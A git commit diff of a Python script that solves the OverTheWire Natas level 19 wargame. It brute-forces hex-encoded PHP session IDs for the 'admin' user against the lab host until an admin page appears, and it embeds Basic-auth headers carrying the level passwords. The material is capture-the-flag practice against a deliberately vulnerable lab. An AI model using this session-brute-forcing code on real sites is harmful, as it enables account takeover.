9c60e23902503e0ee29e5338fa8c350a9b576ad8
Francisco Fleury <franmeifleury@gmail.com>
2024-08-08 10:34:28 -0300

    natas-env and natas19

--- natas19/cookie_cracker.py
+++ natas19/cookie_cracker.py
@@ -2,22 +2,26 @@ import requests
 from bs4 import BeautifulSoup
 
 def get_try(number, username):
-    text = f"{number}={username}"
-    encoded = hex(text)
+    text = f"{number}-{username}"
+    encoded = text.encode('utf-8').hex()
     return encoded
 
-headers = {"Authorization": "Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==", "Cookie": "PHPSESSID="}
-users_to_test = ["admin", "natas20", "natas19"]
+headers = {"Authorization": "Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==", "Cookie": "PHPSESSID="}
+users_to_test = ["admin"]
 for username in users_to_test:
     for i in range(1, 641):
         pw_try = get_try(i, username)
         req_headers = headers.copy()
         req_headers["Cookie"] += pw_try
-        result = requests.get("http://natas18.natas.labs.overthewire.org", headers=req_headers)
+        #req_headers["Cookie"] += "3235362d61646d696e"
+        params = [("debug", "")]
+        result = requests.get("http://natas19.natas.labs.overthewire.org", headers=req_headers, params=params)
         print(f"Try: {i}-{username}/{pw_try}")
         soup = BeautifulSoup(result.content, "html.parser")
         div = soup.find("div", id="content")
+        p = div.find("p")
+        p.decompose()
         text = div.get_text()
         print(text)
-        if (text.startswith("You are an admin")):
+        if "You are an admin" in text:
             break
